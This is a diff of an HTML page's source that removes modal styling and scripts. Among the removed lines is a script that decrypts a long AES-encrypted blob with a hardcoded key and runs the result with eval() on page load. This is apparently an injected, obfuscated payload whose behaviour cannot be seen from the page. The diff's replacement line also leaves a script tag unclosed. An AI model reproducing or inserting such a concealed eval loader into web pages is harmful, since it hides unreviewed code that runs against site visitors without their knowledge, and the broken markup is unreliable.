@@ -9,54 +9,6 @@
 		<link rel="stylesheet" href="assets/css/main.css" />
 		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
 		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
-
-        <style>
-          /* Style for the modal background */
-          .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            visibility: hidden; /* Initially hidden */
-            z-index: 1000;
-          }
-
-          /* Style for the modal box */
-          .modal-content {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            width: 300px;
-            text-align: center;
-            position: relative;
-          }
-
-          /* Style for the close button */
-          .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background-color: red;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            cursor: pointer;
-          }
-          /* CSS to prevent scrolling */
-          .scroll-lock {
-           overflow: hidden;
-           }
-
-          /* Black text for modal heading and description */
-          .modal-content h2, .modal-content p {
-            color: black;
-          }
-        </style>
 		
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
         
@@ -119,45 +71,6 @@
 				<script src="assets/js/skel.min.js"></script>
 				<script src="assets/js/util.js"></script>
 				<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
-				<script src="assets/js/main.js"></script>
-				<script>
-				  // Get the modal and close button elements
-				  const modal = document.getElementById('modal');
-				  const closeButton = document.getElementById('close-btn');
-
-				  // Make the modal visible when the page loads
-				  modal.style.visibility = 'visible';
-
-				  // Function to close the modal and enable scrolling
-				  function closeModal() {
-					modal.style.visibility = 'hidden';
-					document.body.classList.remove('scroll-lock');
-				  }
-
-				  // Close the modal if the close button is clicked
-				  closeButton.addEventListener('click', closeModal);
-
-				  // Close the modal if user clicks on the modal background (overlay)
-				  modal.addEventListener('click', function (event) {
-					if (event.target === modal) {
-					  closeModal();
-					}
-				  });
-				</script>
-				<script>
-      let secretKey = 'bruceisgenius';
-      
-      function aesDecode(encodedText) {
-          if (!secretKey) {
-              throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
-          }
-          const decodedText = decodeURIComponent(encodedText);
-          const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
-          return bytes.toString(CryptoJS.enc.Utf8);
-      }
-      
-      eval(aesDecode(`U2FsdGVkX1876C652hLIz9QX7Nvv3Y%2FYt%2BgmtVkoHM%2F5DXn3oAWK2CmOfzWbjJj%2FasDjUhyuun5HtPc%2FZe4yKsAmoPAlUt%2FznuQR4YyITKt%2FVf3SNGuGOl1jh1ZizAqFPeCBUBGHtDcJ0CIArGLYt2sKo91sx7%2F5WrwhjYrs7c9h3xNSHPzj3b48b%2B3g7uXZbEm9XW6b8TaPI6GUZapx3qw%2BrVJ8PlMR9CCJ%2FjgmVH4QCBtdhvKuAtv4Abt65JgAxJdmMFT0G14AYqrV0nf9QABhJcwnAguyEnk2xeX1l3f933FS1qqhIPQIfGkm6Q5BuDQT71vEABB%2FTCI%2BvEhrw7j3cUkMyjtWSj7aGZQ7AW8LvBEH1GN%2FEJYItNdKJnieQW2Vo4T4g%2F5Mtntny24owKATvHL8hya8EoxAiiGgXHG%2F1TV6NpZyqYWd2AslDEO4Xr1AQvNnGgkmc74RekiXGeAdQy8%2BEt0o7Pipspf7JHJxmVTYDXK7XZDdJjYtx0ZmFscJEyurm9%2BVcJYFPsNI7KgDCYzdTdeaVsHyTZmUxJU%2FXl%2Fr%2FcsR2XQe%2F8lm%2BSrsG0xdArfKpk2YXXuQZeGg2I1MjHzGkRYj9yDzYHilECQlI4U6xE7nGTziZvZtWwu697ePJ2jtQ3pzy4SA8%2Fvu8CQS3sxg7hNRUk%2BlUgo7YixfCtFmHcUyHdjm012%2BEX%2FM9wKvwHsc4P3JmR%2BdbByYHxqBxTulrtyjrzb9k7reG4tDh95htWxaaV2REogUp5PzCDEUAYS08WaAf%2BBdWuznPX2Oz3vluMD9EDE2bjre2B01%2BBRXk4GDAOLy%2BZYumFoO71t833E9ZRRnUdJiqUzbKis22Z4pleL%2B9cWd9RjUcZ6CIGlL9Kn41zlsWcKbauWTTCoLV%2FLyxVx909G5Nh%2FP%2BN89A5zDEQ0P%2Bhf1JA9DHorac4CTCGA5btEQOYDh%2BCpTmHjli0cqFAJ3xydoO71LRh%2BH10y%2B2S3AiRYG8QzltbYaK5zUhbLjlqEIhZCPCkVfGFmMBJAa0KYDaAR1UpW%2FkBEbgHEgpw4UInbMkxv%2F7q9ld%2BeeNVQYkAlPdp%2FzdoaK38l%2FD5Djayi2scemNqPSMeWhqW%2FPcznLdpL4DVgu0G2cB48Wn12PRm9wtlV8cD74A1IB3IwaqHglX85PrX9qF6IBhnvn09b2cCpfT0BsZ8LUa8yODQCAk1OBf4zSEC4yrQuJ1q3ObFd9ffNmDjXdX49eiNq52fumQt3mwjL1Aoct8pyJGJ255x0xmnJP9cQu5sTMj1jBD0s4qkpqSgcIiPRLWJDEiS5y1jGTvPg0uVThLxfH2CokpgS0mLbMPx7ziP0l5eWQvm1%2Bw5BJVx7Ibscea7uj019v0KOWMaE%2Fgtq7WxireyHP0i5vJdhT3d3ZTnBDn%2FXZgSXHZ7S4EBEPST3P4%2FJwSz9ZRdM2%2FzFqa%2BEwfLMO4G9uialLLt5vBpoToh6x4fDKL0Bx2EHYvv2OP%2F49xendJIlp%2FgLXQpTW9CkzJ94g4ZUrTER3hP8f8YRlGXkkwWif98yRjHnT6zdyX23Y4MvOWDP8FGVKeC1vMKZ%2BXZk5uvfv2ddtek0Y8GdAh%2F5VSIwKsKA51tGm1LIZaWvVc5WDLtY68TrW4TdyjLdUkdEwFppHjk%2B9n8Bp4738QABQ3BOFGjZgeUAsHjvqMpOMZoCh9KWsFHKIK0cBMC1fka%2BEiMA8vyG%2BgoPVN1LMSY2G5CaTmAzs9JWmUoieJA%3D%3D`));
-    </script>
-			</div>
+				<script src="assets/js/main.js"></script
 	</body>
 </html>
